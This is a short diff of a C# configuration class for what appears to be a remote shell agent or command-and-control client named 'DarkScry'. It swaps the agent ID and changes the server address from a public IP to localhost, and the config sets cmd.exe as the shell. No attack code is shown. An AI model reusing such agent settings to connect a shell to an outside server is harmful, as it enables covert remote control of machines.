@@ -8,10 +8,10 @@ namespace DarkScryClient
 	}
 	internal class Config
 	{
-		public static string agent_id = "95a0f517-714f-4995-8a08-f54a531e75e4";
+		public static string agent_id = "8ec24819-1c1f-4e98-95d2-f86ceaeb339f";
 		public static string MainShell = "cmd.exe";
 		public static bool IsMainShellRuning = false;
-                public static string ServerIp = "172.236.98.55";
+                public static string ServerIp = "127.0.0.1";
                 public static readonly string AgentName = "DarkScry Cleint";
                 public static readonly string AgnetVersion = "1.0.0";
 
